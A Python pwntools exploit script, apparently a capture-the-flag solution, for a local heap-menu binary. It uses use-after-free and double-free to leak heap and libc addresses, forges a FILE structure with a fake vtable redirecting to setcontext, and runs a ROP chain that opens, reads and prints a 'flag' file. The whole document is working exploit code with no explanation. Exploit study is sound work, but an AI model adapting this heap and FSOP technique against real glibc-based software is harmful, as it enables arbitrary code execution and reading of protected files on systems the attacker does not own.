from pwn import *
context(arch='i386',os='linux',log_level='debug')

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x, drop=True)
r = lambda :io.recv()
it = lambda: io.interactive()
success = lambda x, y:log.success(x + ' '+ hex(y))

binary = './pwn'

io = process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(idx, size, cont):
    ru('Choice:')
    sl('1')
    ru('input your index:\n')
    sl(str(idx))
    ru('input your size:\n')
    sl(str(size))
    ru('input your context:')
    sl(cont)

def dele(idx):
    ru('Choice:')
    sl('2')
    ru('input your index:\n')
    sl(str(idx))

def show(idx):
    ru('Choice:')
    sl('3')
    ru('input your index:\n')
    sl(str(idx))

def change(idx):
    ru('Choice:')
    sl('4')
    ru('input your index:\n')
    sl(str(idx))

for i in range(4):
    add(i, 0x80, 'abc')

add(7, 0xe0, 'abc')
add(8, 0xe0, 'abc')


dele(2)
dele(0)

show(0)
ru(': ')
heap_base = u64(ru('\n').ljust(8,'\x00')) & ~0xfff
success('heap base:', heap_base)

dele(1)

show(0)
ru(': ')
leak = u64(ru('\n').ljust(8,'\x00'))
success('leak:', leak)
libc.address = leak - 0x3c4b78
success('libc base', libc.address)

payload = 'a' * 0x80 + p64(0) + p64(0x91) \
    + 'a' * 0x80 + p64(0) + p64(0x21) \
    + p64(0) * 2 + p64(0) + p64(0x21)
add(4, 0x1a0, payload)
dele(4)
dele(1)
add(5, 0x1a0, 'a'*0x80+p64(0)+p64(0x91)+p64(leak)+p64(leak + 0x1c70))
add(6, 0x80, 'abc')


heap_addr = heap_base + 0x13 - 0x8
dele(7)
dele(8)
dele(7)


heap_b = heap_base + 0x470 + 0x10
heap_a = heap_base + 0x560 + 0x10


add(9, 0xe0, p64(heap_addr))

pop_rdi = libc.address + 0x0000000000021102
pop_rsi = libc.address + 0x00000000000202e8
pop_rdx = libc.address + 0x0000000000001b92

fake_vtable = p64(libc.sym['setcontext']+53)
fake_io_struct = p64(0xfbda2008) \
    + p64(0) * 4 \
    + p64(1) \
    + p64(0) * 3 \
    + p64(0) * 4 + p64(heap_b) \
    + p64(0) + p64(0) * 2 + p64(0) \
    + p64(0xffffffffffffffff) + p64(0) + p64(heap_b+0x48)  \
    + p64(libc.sym['open']) + p64(0) * 5 + p64(heap_base+0x80-0x18)

add(0xa, 0xe0, fake_io_struct)


ropchain = 'flag\x00\x00\x00\x00' + p64(heap_b) + p64(0)
ropchain = ropchain.ljust(0xa0-0x60, '\x00')
ropchain += p64(0)
ropchain += p64(pop_rdi) + p64(4)
ropchain += p64(pop_rsi) + p64(heap_base + 0x240)
ropchain += p64(pop_rdx) + p64(0x100) + p64(libc.sym['read'])
ropchain += p64(pop_rdi) + p64(1)
ropchain += p64(pop_rsi) + p64(heap_base + 0x240)
ropchain += p64(pop_rdx) + p64(0x100) + p64(libc.sym['write'])
add(0xb, 0xe0, ropchain)

payload = p64(heap_base+0x93)[3:] \
    + p64(heap_base+0x93) * 6 \
    + p64(heap_base+0x93+1) + p64(0) * 4 + p64(heap_a)
    #+ p64(3) + p64(0) * 2 + p64(heap_base+0xf0) \
    #+ p64(0xffffffffffffffff) + p64(0) + p64(heap_base+0x100)  \
    #+ p64(0) * 6 + 'aaaaaaaa'
add(0xd, 0xe0, payload + fake_vtable)
sl('5')
it()